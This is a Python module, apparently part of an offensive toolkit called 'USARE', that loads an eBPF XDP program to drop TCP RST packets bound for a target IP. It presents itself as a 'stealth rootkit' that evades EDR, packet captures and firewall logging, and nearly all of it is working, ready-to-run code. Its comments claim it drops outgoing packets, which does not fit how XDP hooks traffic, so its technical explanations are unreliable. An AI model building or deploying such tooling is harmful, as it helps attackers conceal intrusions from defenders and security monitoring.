"""
USARE eBPF XDP Stealth Rootkit
Uses eBPF (Extended Berkeley Packet Filter) to manipulate network traffic at the lowest
level of the Linux kernel, bypassing iptables, netfilter, and EDR network hooks.
Requires: bcc, python3-bpfcc, Linux kernel 4.15+
"""

import os
import logging
from typing import Optional

logger = logging.getLogger("usare.ebpf_stealth")

try:
    from bcc import BPF # type: ignore
    HAS_BCC = True
except ImportError:
    BPF = None
    HAS_BCC = False

# This XDP C program hooks into the network interface BEFORE the SKB is even allocated.
# It parses the Ethernet, IP, and TCP headers natively in the kernel.
# If it sees an outgoing RST bound for our target (or just any RST we didn't want),
# it silences it immediately (XDP_DROP), leaving zero trace in pcap, iptables, or socket logs.
XDP_PROGRAM = r"""
#include <uapi/linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/in.h>

// BPF map to communicate target IP from userspace to kernel
BPF_HASH(target_ip_map, u32, u32);

int xdp_stealth_rst_drop(struct xdp_md *ctx) {
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    if (ip->protocol != IPPROTO_TCP)
        return XDP_PASS;

    struct tcphdr *tcp = (void *)(ip + 1);
    if ((void *)(tcp + 1) > data_end)
        return XDP_PASS;

    // Check if this is a RST packet
    if (tcp->rst) {
        // Look up if the destination IP matches our target
        u32 dst_ip = ip->daddr;
        u32 *is_target = target_ip_map.lookup(&dst_ip);
        
        if (is_target) {
            // Drop the TCP RST before the OS (or local EDR) even knows it exists
            // This is the ultimate stealth: the local stack thinks it sent it,
            // but the NIC silences it.
            return XDP_DROP;
        }
    }

    return XDP_PASS;
}
"""

class EBPFStealthRootkit:
    """eBPF-based network activity concealer."""
    
    def __init__(self, interface: str, target_ip: str):
        self.interface = interface
        self.target_ip = target_ip
        self.bpf: Optional['BPF'] = None
        self.fn = None
        
    def start(self) -> bool:
        if not HAS_BCC:
            logger.error("[eBPF] BCC (bpfcc) is not installed. Cannot use eBPF Rootkit stealth.")
            logger.error("[eBPF] Run on Kali: apt install python3-bpfcc bpfcc-tools linux-headers-$(uname -r)")
            return False
            
        if os.geteuid() != 0:
            logger.error("[eBPF] eBPF requires strictly root privileges.")
            return False
            
        try:
            logger.info(f"[eBPF] Attaching kernel XDP stealth rootkit to interface {self.interface}...")
            
            # Compile BPF
            self.bpf = BPF(text=XDP_PROGRAM)
            
            # Attach XDP to interface
            self.fn = self.bpf.load_func("xdp_stealth_rst_drop", BPF.XDP)
            self.bpf.attach_xdp(self.interface, self.fn, 0)
            
            # Convert target IP to 32-bit int (network byte order)
            import socket, struct
            packed_ip = socket.inet_aton(self.target_ip)
            ip_int = struct.unpack("I", packed_ip)[0]
            
            # Insert into BPF hash map
            target_map = self.bpf.get_table("target_ip_map")
            target_map[target_map.Key(ip_int)] = target_map.Leaf(1)
            
            logger.info(f"  [green]✓[/green] [eBPF] Rootkit Active on {self.interface} targeting {self.target_ip}.")
            logger.info("      [yellow]TCP RSTs will be dropped in-kernel instantly, invisible to local EDR/wireshark.[/yellow]")
            return True
            
        except Exception as e:
            logger.error(f"[eBPF] Failed to attach XDP: {e}")
            if "Operation not permitted" in str(e) or "doesn't support XDP" in str(e):
                logger.error("[eBPF] Ensure your network driver supports XDP natively or in generic mode.")
            self.cleanup()
            return False
            
    def cleanup(self):
        """Detach the XDP program and clean up."""
        if self.bpf and self.fn:
            logger.info(f"[eBPF] Detaching XDP stealth rootkit from {self.interface}...")
            try:
                self.bpf.remove_xdp(self.interface, 0)
            except Exception as e:
                logger.error(f"[eBPF] Error detaching XDP: {e}")
            finally:
                self.bpf = None
                self.fn = None

    def __enter__(self):
        self.start()
        return self
        
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()

